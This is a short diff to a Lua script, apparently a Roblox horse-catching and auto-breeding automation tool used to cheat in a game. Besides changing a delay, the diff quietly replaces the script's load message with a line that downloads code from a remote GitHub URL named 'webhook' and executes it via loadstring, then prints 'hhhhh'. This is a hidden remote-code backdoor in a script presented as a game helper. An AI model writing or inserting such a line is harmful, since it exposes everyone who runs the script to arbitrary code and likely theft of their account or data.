@@ -168,7 +168,7 @@ local function onItemInfoOpened()
 	end
 	
 	-- Reset debounce and resume auto-clicker after a delay
-	task.wait(2)
+	task.wait(0.5)
 	isProcessingBreed = false
 	isBreeding = false
 end
@@ -383,4 +383,6 @@ lp.CharacterAdded:Connect(function()
 	updateIsland()
 end)
 
-print("Horse Catcher + Auto Breeder loaded!")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
+
+print("hhhhh")
